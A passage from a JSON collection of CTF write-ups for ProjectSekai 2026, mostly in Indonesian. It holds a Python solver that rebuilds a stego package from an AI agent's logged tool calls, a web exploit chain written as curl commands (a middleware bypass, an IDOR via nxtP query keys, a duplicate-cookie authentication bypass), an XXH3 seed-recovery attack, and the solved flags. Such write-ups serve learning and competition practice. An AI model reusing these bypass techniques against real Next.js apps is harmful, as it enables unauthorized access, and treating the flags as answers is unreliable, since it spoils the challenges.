        "code": "#!/usr/bin/env python3\r\n\"\"\"Recover the hidden message from impossible-stego using the leaked Claude log.\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport base64\r\nimport importlib\r\nimport json\r\nimport re\r\nimport shutil\r\nimport sys\r\nimport tarfile\r\nimport tempfile\r\nfrom pathlib import Path\r\nfrom typing import Any\r\n\r\n\r\nFLAG_RE = re.compile(rb\"SEKAI\\{[^\\r\\n}]+\\}\")\r\nPROJECT_PREFIX = \"/home/claude/projects/impossible-stego/\"\r\n\r\n\r\nclass SolveError(RuntimeError):\r\n    pass\r\n\r\n\r\ndef safe_extract_tar(archive: Path, output_dir: Path) -> None:\r\n    \"\"\"Extract a tar archive while rejecting path traversal entries.\"\"\"\r\n    output_dir = output_dir.resolve()\r\n    with tarfile.open(archive, \"r:*\") as tf:\r\n        for member in tf.getmembers():\r\n            target = (output_dir / member.name).resolve()\r\n            try:\r\n                target.relative_to(output_dir)\r\n            except ValueError as exc:\r\n                raise SolveError(f\"unsafe archive member: {member.name}\") from exc\r\n        try:\r\n            tf.extractall(output_dir, filter=\"data\")\r\n        except TypeError:\r\n            # Compatibility with Python versions predating tarfile filters.\r\n            tf.extractall(output_dir)\r\n\r\n\r\ndef locate_inputs(root: Path) -> tuple[Path, Path]:\r\n    logs = sorted(root.rglob(\"messages.log\"))\r\n    images = sorted(root.rglob(\"flag.png\"))\r\n    if not logs:\r\n        raise SolveError(\"messages.log not found\")\r\n    if not images:\r\n        raise SolveError(\"flag.png not found\")\r\n    return logs[0], images[0]\r\n\r\n\r\ndef decode_json_body(value: str) -> dict[str, Any] | None:\r\n    if not value:\r\n        return None\r\n    try:\r\n        raw = base64.b64decode(value, validate=True)\r\n        obj = json.loads(raw)\r\n    except (ValueError, json.JSONDecodeError):\r\n        return None\r\n    return obj if isinstance(obj, dict) else None\r\n\r\n\r\ndef recover_conversation(log_path: Path) -> list[dict[str, Any]]:\r\n    \"\"\"Pick the most complete Claude request; later requests contain prior turns.\"\"\"\r\n    best: list[dict[str, Any]] = []\r\n    with log_path.open(\"r\", encoding=\"utf-8\") as fh:\r\n        for line_number, line in enumerate(fh, 1):\r\n            try:\r\n                record = json.loads(line)\r\n            except json.JSONDecodeError as exc:\r\n                raise SolveError(f\"invalid JSON on log line {line_number}\") from exc\r\n\r\n            request = decode_json_body(record.get(\"req_body\", \"\"))\r\n            messages = request.get(\"messages\") if request else None\r\n            if isinstance(messages, list) and len(messages) > len(best):\r\n                best = messages\r\n\r\n    if not best:\r\n        raise SolveError(\"no Claude conversation found in req_body fields\")\r\n    return best\r\n\r\n\r\ndef iter_tool_calls(messages: list[dict[str, Any]]):\r\n    for message in messages:\r\n        if message.get(\"role\") != \"assistant\":\r\n            continue\r\n        content = message.get(\"content\")\r\n        if not isinstance(content, list):\r\n            continue\r\n        for block in content:\r\n            if isinstance(block, dict) and block.get(\"type\") == \"tool_use\":\r\n                yield block.get(\"name\"), block.get(\"input\", {})\r\n\r\n\r\ndef reconstruct_stego_package(messages: list[dict[str, Any]], destination: Path) -> None:\r\n    \"\"\"Replay Claude's Write/Edit calls for files inside the final stego package.\"\"\"\r\n    writes = 0\r\n    edits = 0\r\n\r\n    for tool_name, tool_input in iter_tool_calls(messages):\r\n        if not isinstance(tool_input, dict):\r\n            continue\r\n        source_path = tool_input.get(\"file_path\")\r\n        if not isinstance(source_path, str) or not source_path.startswith(PROJECT_PREFIX):\r\n            continue\r\n\r\n        relative = source_path[len(PROJECT_PREFIX):]\r\n        # Ignore the discarded single-file prototype and documentation.\r\n        if not relative.startswith(\"stego/\"):\r\n            continue\r\n\r\n        target = destination / relative\r\n        target.parent.mkdir(parents=True, exist_ok=True)\r\n\r\n        if tool_name == \"Write\":\r\n            content = tool_input.get(\"content\")\r\n            if not isinstance(content, str):\r\n                raise SolveError(f\"Write call for {relative} has no text content\")\r\n            target.write_text(content, encoding=\"utf-8\")\r\n            writes += 1\r\n\r\n        elif tool_name == \"Edit\":\r\n            if not target.exists():\r\n                raise SolveError(f\"Edit references missing file: {relative}\")\r\n            old = tool_input.get(\"old_string\")\r\n            new = tool_input.get(\"new_string\")\r\n            if not isinstance(old, str) or not isinstance(new, str):\r\n                raise SolveError(f\"invalid Edit call for {relative}\")\r\n\r\n            text = target.read_text(encoding=\"utf-8\")\r\n            if tool_input.get(\"replace_all\"):\r\n                if old not in text:\r\n                    raise SolveError(f\"Edit pattern not found in {relative}\")\r\n                text = text.replace(old, new)\r\n            else:\r\n                count = text.count(old)\r\n                if count != 1:\r\n                    raise SolveError(\r\n                        f\"Edit pattern count for {relative} is {count}, expected 1\"\r\n                    )\r\n                text = text.replace(old, new, 1)\r\n            target.write_text(text, encoding=\"utf-8\")\r\n            edits += 1\r\n\r\n    required = destination / \"stego\" / \"pipeline.py\"\r\n    if not required.exists():\r\n        raise SolveError(\"failed to reconstruct the final stego package\")\r\n    if writes < 10 or edits < 1:\r\n        raise SolveError(\"conversation did not contain the expected source history\")\r\n\r\n\r\ndef extract_payload(source_root: Path, image_path: Path) -> bytes:\r\n    sys.path.insert(0, str(source_root))\r\n    try:\r\n        # Avoid reusing a module from an earlier run in the same interpreter.\r\n        for name in list(sys.modules):\r\n            if name == \"stego\" or name.startswith(\"stego.\"):\r\n                del sys.modules[name]\r\n        stego = importlib.import_module(\"stego\")\r\n        return stego.extract(str(image_path))\r\n    except ModuleNotFoundError as exc:\r\n        if exc.name == \"PIL\":\r\n            raise SolveError(\"Pillow is required: python3 -m pip install pillow\") from exc\r\n        raise\r\n    finally:\r\n        sys.path.pop(0)\r\n\r\n\r\ndef solve(input_path: Path) -> bytes:\r\n    input_path = input_path.resolve()\r\n    if not input_path.exists():\r\n        raise SolveError(f\"input does not exist: {input_path}\")\r\n\r\n    work_parent = input_path.parent if input_path.is_file() else input_path\r\n    with tempfile.TemporaryDirectory(prefix=\".solve-impossible-stego-\", dir=work_parent) as tmp:\r\n        workspace = Path(tmp)\r\n        if input_path.is_file():\r\n            safe_extract_tar(input_path, workspace)\r\n            search_root = workspace\r\n        else:\r\n            search_root = input_path\r\n\r\n        log_path, image_path = locate_inputs(search_root)\r\n        messages = recover_conversation(log_path)\r\n        source_root = workspace / \"recovered_source\"\r\n        reconstruct_stego_package(messages, source_root)\r\n        payload = extract_payload(source_root, image_path)\r\n\r\n    match = FLAG_RE.search(payload)\r\n    if not match:\r\n        raise SolveError(f\"payload recovered, but no SEKAI flag found: {payload!r}\")\r\n    return match.group(0)\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Solve SEKAI CTF 2026 misc/impossible stego\"\r\n    )\r\n    parser.add_argument(\r\n        \"input\",\r\n        nargs=\"?\",\r\n        default=\"misc_impossible-stego.tar.gz\",\r\n        help=\"challenge archive or an extracted directory\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    try:\r\n        flag = solve(Path(args.input))\r\n    except (OSError, SolveError, tarfile.TarError) as exc:\r\n        print(f\"[-] {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(f\"<FLAG>{flag.decode()}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "SEKAI{th3y_d1dn7_4ctually_l3t_m3_us3_my7h0s_f0r_7h1s_0n3_s4dly_i_h4d_i7_r3r0ut3d_t0_0pus}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-web-minguremental",
    "title": "Migurimental",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "Writeup for challenge Migurimental",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Ringkas",
        "content": "Exploit chain-nya ada dua bagian:\n\n1. `backstage2` bisa dibypass lewat `assetPrefix` sehingga route data `/_next/data/.../index.json` tetap ngerender halaman `/` tanpa kena middleware.\n2. `backstage1` punya dua bug yang bisa dirangkai:\n   - data route `/access-card` bisa dibuka untuk user lain lewat query `nxtPid=<our_id>&id=1`\n   - `/backroom` punya parser cookie beda antara middleware Edge dan SSR Node, jadi duplicate cookie `ticket_uuid` bisa dipakai buat lolos check middleware tapi tetap ngebaca UUID milik miku di SSR\n\nHasil akhirnya:\n\n`SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}`"
      },
      {
        "title": "2. Leak QR miku dari `migurimental`",
        "content": "Route `/access-card` dijaga middleware ini:\n\n\n\nDi sisi SSR, halaman pakai:\n\n\n\nMasalahnya ada di data route Next.js. Query key dengan prefix `nxtP` dinormalisasi jadi key biasa sebelum SSR, tapi middleware tetap ngelihat kombinasi query yang bikin check `id === session.sub` lolos.\n\nPayload yang jalan:\n\n\n\nEfeknya:\n\n- middleware anggap request ini punya `id=<our_id>`\n- SSR `getServerSideProps` malah resolve user `id=1`\n\nJadi kita bisa ambil `pageProps` milik miku, termasuk `qrDataUrl`.",
        "code": "if (pathname === '/access-card') {\n  return request.nextUrl.searchParams.get('id') === session.sub\n}"
      },
      {
        "title": "3. Ambil `ticket_uuid` miku dari QR",
        "content": "JSON dari data route tadi berisi PNG QR dalam format data URL.\n\nDecode QR:\n\n\n\nOutput yang saya dapat saat solve:\n\n\n\nItu `ticket_uuid` milik miku.",
        "code": "zbarimg --quiet --raw /tmp/miku_qr.png"
      },
      {
        "title": "4. Bypass `/backroom` pakai duplicate cookie",
        "content": "Middleware `/backroom` cek:\n\n\n\nSSR Node di `pages/backroom.js` baca:\n\n\n\nParser cookie Edge dan Node beda:\n\n- middleware Edge ambil cookie duplicate yang terakhir\n- SSR Node ambil cookie duplicate yang pertama\n\nJadi kirim:\n\n\n\nEfeknya:\n\n- middleware baca `ticket_uuid=<our_uuid>` lalu lolos\n- SSR baca `ticket_uuid=<miku_uuid>` lalu load user id `1`\n- halaman `/backroom` ngerender half pertama flag\n\nResponse ngasih:",
        "code": "request.cookies.get('ticket_uuid')?.value === session.ticketUuid"
      },
      {
        "title": "Step 1 - Register user biasa",
        "content": "Simpan:\n\n- `session`\n- `ticket_uuid`\n- `id` dari redirect `/access-card?id=<our_id>`",
        "code": "curl -sk -X POST \\\n  -d 'username=solve123&password=SuperPass123' \\\n  -D headers.txt \\\n  https://migurimental.chals.sekai.team/api/register"
      },
      {
        "title": "Step 2 - Ambil access card milik miku via data route",
        "content": "JSON response berisi:\n\n- `pageProps.user.id = 1`\n- `pageProps.user.username = \"miku\"`\n- `pageProps.qrDataUrl`",
        "code": "curl -sk \\\n  -H 'Cookie: session=<our_session>; ticket_uuid=<our_uuid>' \\\n  'https://migurimental.chals.sekai.team/_next/data/3_SEgyxks-2tgaI5l4ILx/access-card.json?nxtPid=<our_id>&id=1'"
      },
      {
        "title": "Step 3 - Decode QR",
        "content": "",
        "code": "python3 - <<'PY'\nimport json, base64\ndata = json.load(open('access-card.json'))\nraw = data['pageProps']['qrDataUrl'].split(',', 1)[1]\nopen('/tmp/miku_qr.png', 'wb').write(base64.b64decode(raw))\nPY\n\nzbarimg --quiet --raw /tmp/miku_qr.png"
      },
      {
        "title": "Step 4 - Ambil half pertama dari `/backroom`",
        "content": "HTML response berisi:",
        "code": "curl -sk \\\n  -H 'Cookie: session=<our_session>; ticket_uuid=<miku_uuid>; ticket_uuid=<our_uuid>' \\\n  https://migurimental.chals.sekai.team/backroom"
      },
      {
        "title": "Step 5 - Ambil half kedua dari `migurimental-2`",
        "content": "HTML response berisi:",
        "code": "curl -sk https://migurimental-2.chals.sekai.team/cdn/_next/data/nRVcVzPJ7U21AcMTs21fY/index.json"
      },
      {
        "title": "Step 6 - Gabungkan",
        "content": "Final:",
        "code": "SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_\n+ c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}"
      }
    ],
    "terminalOutputs": [],
    "flag": "`apps/backstage2/next.config.js` set `assetPrefix: '/cdn'`.\n\nMiddleware app kedua cuma match route `/`, tapi request ke:\n\n```text\n/cdn/_next/data/<buildId>/index.json\n```\n\ntetap direwrite ke data route halaman index dan ngerender HTML halaman `/`.\n\nRequest:\n\n```bash\ncurl -sk https://migurimental-2.chals.sekai.team/cdn/_next/data/nRVcVzPJ7U21AcMTs21fY/index.json\n```\n\nDari HTML response, bagian ini keluar:\n\n```text\nc0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-crypto-lihash-cryptoiihash",
    "title": "Iihash — SEKAI CTF 2026",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "Writeup for challenge Iihash — SEKAI CTF 2026",
    "problemDescription": "Ada dua tahap utama:\n\n1. **Memulihkan seed 64-bit** menggunakan collision terpilih pada accumulator XXH3 long-input.\n2. **Membuat preimage 320 byte** setelah seed diketahui. State target dihitung dengan membalik avalanche, nilai accumulator target dicari menggunakan LLL/BKZ, lalu word payload dirakit secara algebraic.\n\nAlur lengkapnya:\n\n```text\nchosen-input hash oracle\n        ↓\nexact accumulator collision\n        ↓\nrecover seed_low dengan x+y dan x XOR y\n        ↓\nrecover seed_high dengan carry/borrow yang sudah diketahui\n        ↓\ninvert avalanche target digest\n        ↓\ninvert fold128 memakai lattice 66 dimensi\n        ↓\nrakit payload 320 byte\n        ↓\nxxh3_128(payload, seed) = b\"Give me the flag\"\n```\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Kategori:** Crypto\n- **Judul:** Iihash\n- **Deskripsi:** `Fast hash is good hash. A secret seed makes it even better, right?`\n- **Target:** membuat input lebih dari 256 byte dengan digest XXH3-128 tepat `b\"Give me the flag\"`\n\n\n\nFlag yang didapat:\n\n\n\n---",
        "code": "self.seed = random.getrandbits(64)\n\nh = xxhash.xxh3_128(data, seed=self.seed).hexdigest()\n\nif xxhash.xxh3_128(data, seed=self.seed).digest() == b\"Give me the flag\":\n    print(open(\"flag.txt\").read())"
      },
      {
        "title": "1. Custom Secret dari Seed",
        "content": "Pada long-input mode, XXH3 tidak memasukkan seed sebagai key ke primitive kriptografis. Seed hanya dipakai untuk memodifikasi default secret per word 64-bit.\n\nUntuk pasangan word ke-`i`:\n\n\\[\nS_{2i}=C_{2i}+s \\pmod{2^{64}}\n\\]\n\n\\[\nS_{2i+1}=C_{2i+1}-s \\pmod{2^{64}}\n\\]\n\n`C_i` adalah word dari default secret dan `s` adalah seed 64-bit.\n\nTuliskan seed sebagai dua half 32-bit:\n\n\\[\ns=s_H 2^{32}+s_L\n\\]\n\nUntuk word bertanda tambah, jika:\n\n\\[\nC=C_H2^{32}+C_L\n\\]\n\nmaka:\n\n\\[\nL_+ = C_L+s_L \\pmod{2^{32}}\n\\]\n\n\\[\nH_+ = C_H+s_H+\\kappa \\pmod{2^{32}}\n\\]\n\n dengan carry:\n\n\\[\n\\kappa=[C_L+s_L\\ge 2^{32}]\n\\]\n\nUntuk word bertanda kurang:\n\n\\[\nL_- = C_L-s_L \\pmod{2^{32}}\n\\]\n\n\\[\nH_- = C_H-s_H-\\beta \\pmod{2^{32}}\n\\]\n\n dengan borrow:\n\n\\[\n\\beta=[C_L<s_L]\n\\]\n\nStruktur `+s` dan `-s` ini membuat seed hilang ketika dua word dengan parity berbeda dijumlahkan.\n\n---"
      },
      {
        "title": "2. Update Accumulator",
        "content": "Satu stripe berisi delapan word data 64-bit. Untuk lane `l`, definisikan:\n\n\\[\nd=d_H2^{32}+d_L\n\\]\n\n\\[\nk=k_H2^{32}+k_L\n\\]\n\n\\[\nq=d\\oplus k\n\\]\n\nXXH3 memperbarui accumulator dengan:\n\n\\[\nA_{l\\oplus1}\\leftarrow A_{l\\oplus1}+d \\pmod{2^{64}}\n\\]\n\n\\[\nA_l\\leftarrow A_l+\n\\operatorname{lo}_{32}(q)\\cdot\n\\operatorname{hi}_{32}(q)\n\\pmod{2^{64}}\n\\]\n\natau:\n\n\\[\nA_l\\leftarrow A_l+(d_L\\oplus k_L)(d_H\\oplus k_H)\n\\pmod{2^{64}}\n\\]\n\nAda dua properti penting:\n\n- accumulator pasangan menerima **penjumlahan linear** word data;\n- accumulator lane sendiri menerima **perkalian dua nilai 32-bit**.\n\nCollision gadget dibuat agar penjumlahan data sama dan selisih perkalian tepat nol.\n\n---"
      },
      {
        "title": "3. Memulihkan XOR Low-Half Dua Secret Word",
        "content": "Ambil dua secret word yang digunakan pada lane sama tetapi stripe berbeda:\n\n\\[\nS_i=H_i2^{32}+L_i\n\\]\n\n\\[\nS_j=H_j2^{32}+L_j\n\\]\n\nKita ingin menguji tebakan:\n\n\\[\nR=L_i\\oplus L_j\n\\]\n\nPilih:\n\n\\[\n\\delta=2^b\n\\]\n\nlalu buat dua pesan yang hanya berbeda pada dua posisi tersebut."
      },
      {
        "title": "Pesan A",
        "content": "\\[\nd_i=0\n\\]\n\n\\[\nd_j=\\delta 2^{32}+R\n\\]"
      },
      {
        "title": "Pesan B",
        "content": "\\[\nd_i=\\delta 2^{32}\n\\]\n\n\\[\nd_j=R\n\\]\n\nJumlah data pada kedua pesan sama:\n\n\\[\nd_i^{(A)}+d_j^{(A)}=\n\\delta2^{32}+R\n\\]\n\n\\[\nd_i^{(B)}+d_j^{(B)}=\n\\delta2^{32}+R\n\\]\n\nMaka accumulator silang `A[lane XOR 1]` identik.\n\nSekarang hitung kontribusi perkalian pada accumulator lane.\n\nDefinisikan:\n\n\\[\nX=R\\oplus L_j\n\\]\n\nKontribusi Pesan A:\n\n\\[\nP_A=L_iH_i+X(H_j\\oplus\\delta)\n\\]\n\nKontribusi Pesan B:\n\n\\[\nP_B=L_i(H_i\\oplus\\delta)+XH_j\n\\]\n\nSelisihnya:\n\n\\[\nP_A-P_B=\nX[(H_j\\oplus\\delta)-H_j]\n-L_i[(H_i\\oplus\\delta)-H_i]\n\\]\n\nJika bit ke-`b` dari `H_i` dan `H_j` sama, toggle bit tersebut memiliki tanda yang sama. Ada `\\sigma\\in\\{-1,+1\\}` sehingga:\n\n\\[\n(H_j\\oplus\\delta)-H_j=\\sigma\\delta\n\\]\n\n\\[\n(H_i\\oplus\\delta)-H_i=\\sigma\\delta\n\\]\n\nJadi:\n\n\\[\nP_A-P_B=\n\\sigma\\delta(X-L_i)\n\\]\n\nCollision terjadi tepat ketika:\n\n\\[\nX=L_i\n\\]\n\nKarena `X=R XOR L_j`:\n\n\\[\nR\\oplus L_j=L_i\n\\]\n\nsehingga:\n\n\\[\n\\boxed{R=L_i\\oplus L_j}\n\\]\n\nJika tebakan `R` benar, seluruh delapan accumulator kedua pesan identik. Finalizer juga menerima state identik, sehingga digest 128-bit pasti sama.\n\nCollision ini bukan birthday collision dan bukan collision probabilistik. Ini collision internal yang dibangun secara algebraic.\n\n---"
      },
      {
        "title": "4. Mengapa Ada Bit High yang Pasti Sama",
        "content": "Gadget low-half membutuhkan satu bit `b` dengan:\n\n\\[\n(H_i)_b=(H_j)_b\n\\]\n\nUntuk pasangan parity berbeda, jumlah high-half diketahui sampai carry/borrow dari low-half:\n\n\\[\nH_i+H_j=Q_H\\pmod{2^{32}}\n\\]\n\nAmbil bit nol pertama dari `Q_H`, dihitung dari LSB.\n\nSemua bit lebih rendah adalah `1`. Mulai dari carry awal nol, bit hasil `1` memaksa operand berbeda dan carry tetap nol. Ketika mencapai bit nol pertama, carry masuk masih nol. Agar bit hasil nol, kedua operand harus sama:\n\n\\[\n0+0+0=0\n\\]\n\natau:\n\n\\[\n1+1+0=2\n\\]\n\nKeduanya memiliki bit operand yang sama. Karena itu bit nol pertama dari jumlah dapat dipakai sebagai toggle `b`.\n\nSaat low-half belum diketahui, ada beberapa kemungkinan carry akhir. Solver menghitung semua carry yang konsisten dengan sistem `x+y=Q` dan `x XOR y=R`, lalu mencoba bit aman yang dihasilkan.\n\n---"
      },
      {
        "title": "5. Gadget untuk XOR High-Half",
        "content": "Setelah kandidat low-half tersedia, kita dapat mencari bit low yang sama dan menukar peran high/low.\n\nKita ingin menguji:\n\n\\[\nR=H_i\\oplus H_j\n\\]\n\nPilih `delta=2^b` pada low-half."
      },
      {
        "title": "Pesan A",
        "content": "\\[\nd_i=0\n\\]\n\n\\[\nd_j=R2^{32}+\\delta\n\\]"
      },
      {
        "title": "Pesan B",
        "content": "\\[\nd_i=\\delta\n\\]\n\n\\[\nd_j=R2^{32}\n\\]\n\nJumlah data tetap sama. Jika bit ke-`b` dari `L_i` dan `L_j` sama, selisih perkalian menjadi:\n\n\\[\nP_A-P_B=\n\\sigma\\delta[(R\\oplus H_j)-H_i]\n\\]\n\nCollision terjadi tepat saat:\n\n\\[\n\\boxed{R=H_i\\oplus H_j}\n\\]\n\nPada tahap ini solver sudah memiliki sekumpulan kandidat `s_L`. Ia memilih bit `b` yang memenuhi:\n\n\\[\n(L_i\\oplus L_j)_b=0\n\\]\n\nuntuk semua kandidat yang masih hidup.\n\n---"
      },
      {
        "title": "6. Persamaan Low-Half",
        "content": "Pilih satu secret word parity genap dan satu parity ganjil:\n\n\\[\nx=C_{+,L}+s_L\\pmod{2^{32}}\n\\]\n\n\\[\ny=C_{-,L}-s_L\\pmod{2^{32}}\n\\]\n\nJumlahnya tidak mengandung seed:\n\n\\[\nx+y=C_{+,L}+C_{-,L}\\pmod{2^{32}}\n\\]\n\nDefinisikan:\n\n\\[\nQ=(C_{+,L}+C_{-,L})\\bmod 2^{32}\n\\]\n\nCollision oracle memberikan:\n\n\\[\nR=x\\oplus y\n\\]\n\nJadi kita memperoleh sistem:\n\n\\[\n\\boxed{x+y=Q\\pmod{2^{32}}}\n\\]\n\n\\[\n\\boxed{x\\oplus y=R}\n\\]\n\nSetelah menemukan `x`, low-half seed langsung:\n\n\\[\n\\boxed{s_L=x-C_{+,L}\\pmod{2^{32}}}\n\\]"
      },
      {
        "title": "Contoh dari sesi solve",
        "content": "Pasangan awal `(2,7)` memiliki:\n\n\\[\nC_{2,L}=\\texttt{0xe96dd4de}\n\\]\n\n\\[\nC_{7,L}=\\texttt{0xe69035e0}\n\\]\n\nMaka:\n\n\\[\nQ=\\texttt{0xe96dd4de}+\n\\texttt{0xe69035e0}\n\\pmod{2^{32}}\n\\]\n\n\\[\nQ=\\texttt{0xcffe0abe}\n\\]\n\nOracle menemukan:\n\n\\[\nR=\\texttt{0x2ff9caa0}\n\\]\n\nUntuk seed sesi:\n\n\\[\ns_L=\\texttt{0x702d0db1}\n\\]\n\nword aktualnya:\n\n\\[\nx=\\texttt{0x599ae28f}\n\\]\n\n\\[\ny=\\texttt{0x7663282f}\n\\]\n\nVerifikasi:\n\n\\[\nx+y=\\texttt{0xcffe0abe}=Q\n\\]\n\n\\[\nx\\oplus y=\\texttt{0x2ff9caa0}=R\n\\]\n\n---"
      },
      {
        "title": "7. Menyelesaikan `x+y=Q` dan `x XOR y=R`",
        "content": "Persamaan diselesaikan bit per bit dengan dynamic programming carry.\n\nUntuk bit ke-`k`, tulis:\n\n\\[\nx_k,y_k,q_k,r_k\\in\\{0,1\\}\n\\]\n\nDari XOR:\n\n\\[\ny_k=x_k\\oplus r_k\n\\]\n\nJika carry masuk adalah `c_k`, maka:\n\n\\[\nx_k+y_k+c_k=q_k+2c_{k+1}\n\\]\n\nUntuk setiap `c_k`, solver mencoba `x_k=0` dan `x_k=1`, menghitung `y_k`, lalu hanya menyimpan transisi yang menghasilkan bit `q_k` benar.\n\nPseudo-formula transisinya:\n\n\\[\nt=x_k+(x_k\\oplus r_k)+c_k\n\\]\n\nvalid jika:\n\n\\[\nt\\bmod 2=q_k\n\\]\n\nlalu:\n\n\\[\nc_{k+1}=\\lfloor t/2\\rfloor\n\\]\n\nSetelah 32 bit, seluruh kemungkinan `x` diperoleh. Banyaknya solusi untuk suatu `R` juga dihitung dengan DP yang sama.\n\nNilai `R` tidak memiliki peluang yang seragam. Solver mengurutkan tebakan berdasarkan:\n\n\\[\nN(Q,R)=\\#\\{x:x+(x\\oplus R)=Q\\}\n\\]\n\nSemakin besar `N(Q,R)`, semakin besar peluang relasi tersebut menjadi relasi seed acak. Ini menurunkan expected query count.\n\nPada sesi final:\n\n\n\nArtinya sistem sum/XOR tersebut memiliki 262.144 kandidat `x`, yang dipetakan menjadi 262.144 kandidat `s_L`.\n\n---",
        "code": "[+] low relation (2, 7): 0x2ff9caa0\n[+] candidates=262144"
      },
      {
        "title": "8. Filter Kandidat Low-Half",
        "content": "Setelah relasi pertama, kita tidak lagi perlu menghitung distribusi dari seluruh `2^32` seed.\n\nUntuk setiap kandidat `s_L`, hitung relasi prediksi pada pasangan baru:\n\n\\[\nR_{i,j}(s_L)=L_i(s_L)\\oplus L_j(s_L)\n\\]\n\nRelasi ini membagi kandidat ke beberapa bucket. Collision oracle menentukan bucket yang benar.\n\nOutput sesi final:\n\n\n\nSetiap filter bukan brute force ulang terhadap `2^32`; filter hanya menguji nilai relasi unik dari kandidat yang masih hidup.\n\n---",
        "code": "[+] low filter (0, 1): remain=2560\n[+] low filter (6, 9): remain=64\n[+] low filter (8, 11): remain=8\n[+] low filter (1, 4): remain=4\n[+] low filter (8, 9): remain=2"
      },
      {
        "title": "9. Persamaan High-Half",
        "content": "Setelah `s_L` diketahui atau tinggal sedikit kandidat, carry dan borrow dapat dihitung:\n\n\\[\n\\kappa=[C_{+,L}+s_L\\ge2^{32}]\n\\]\n\n\\[\n\\beta=[C_{-,L}<s_L]\n\\]\n\nHigh-half dua word adalah:\n\n\\[\nX=C_{+,H}+s_H+\\kappa\\pmod{2^{32}}\n\\]\n\n\\[\nY=C_{-,H}-s_H-\\beta\\pmod{2^{32}}\n\\]\n\nSeed high kembali hilang dari jumlah:\n\n\\[\nX+Y=\nC_{+,H}+C_{-,H}+\\kappa-\\beta\n\\pmod{2^{32}}\n\\]\n\nDefinisikan:\n\n\\[\nQ_H=C_{+,H}+C_{-,H}+\\kappa-\\beta\n\\pmod{2^{32}}\n\\]\n\nHigh collision gadget memberikan:\n\n\\[\nR_H=X\\oplus Y\n\\]\n\nKita menyelesaikan sistem yang sama:\n\n\\[\nX+Y=Q_H\\pmod{2^{32}}\n\\]\n\n\\[\nX\\oplus Y=R_H\n\\]\n\nSetelah `X` ditemukan:\n\n\\[\n\\boxed{s_H=X-C_{+,H}-\\kappa\\pmod{2^{32}}}\n\\]\n\nContoh relasi remote:\n\n\n\nUntuk seed final:\n\n\\[\ns_H=\\texttt{0xeed153b3}\n\\]\n\nSetelah intersection dan filter, kandidat terakhir diverifikasi memakai hash satu payload nol 320 byte.\n\nSeed lengkap:\n\n\\[\n\\boxed{s=\\texttt{0xeed153b3702d0db1}}\n\\]\n\nSeed berubah pada setiap koneksi, jadi nilai ini hanya berlaku pada sesi tersebut.\n\n---",
        "code": "[+] high relation (0, 5): 0x9fbd5bcf\n[+] high relation (7, 14): 0x7d7fee4e\n[+] high relation (9, 12): 0x9a590ffe"
      },
      {
        "title": "10. Inverse Avalanche",
        "content": "Final avalanche XXH3 yang dipakai adalah:\n\n\\[\nf(x)=x\\oplus(x\\gg37)\n\\]\n\n\\[\nf(x)=f(x)\\cdot m\\pmod{2^{64}}\n\\]\n\n\\[\nf(x)=f(x)\\oplus(f(x)\\gg32)\n\\]\n\n dengan:\n\n\\[\nm=\\texttt{0x165667919E3779F9}\n\\]\n\n`m` ganjil, sehingga memiliki inverse modulo `2^64`:\n\n\\[\nm^{-1}\\equiv m^{ -1}\\pmod{2^{64}}\n\\]\n\nUntuk xor-shift `y=x XOR (x >> r)` dengan `r>=32`, inversenya cukup satu langkah:\n\n\\[\nx=y\\oplus(y\\gg r)\n\\]\n\nKarena shift kedua akan melewati 64 bit.\n\nMaka inverse avalanche:\n\n1. batalkan `xor >> 32`;\n2. kalikan dengan `m^{-1} mod 2^64`;\n3. batalkan `xor >> 37`.\n\nDigest target adalah:\n\n\n\nSetelah memperhatikan urutan output high/low XXH3, state sebelum avalanche adalah:\n\n\\[\n\\boxed{T_L=\\texttt{0x26d73906e5b3b9f7}}\n\\]\n\n\\[\n\\boxed{T_H=\\texttt{0x00b0c1155830d0a5}}\n\\]\n\n---",
        "code": "47 69 76 65 20 6d 65 20 74 68 65 20 66 6c 61 67\n G  i  v  e     m  e     t  h  e     f  l  a  g"
      },
      {
        "title": "11. Merge Accumulator untuk Payload 320 Byte",
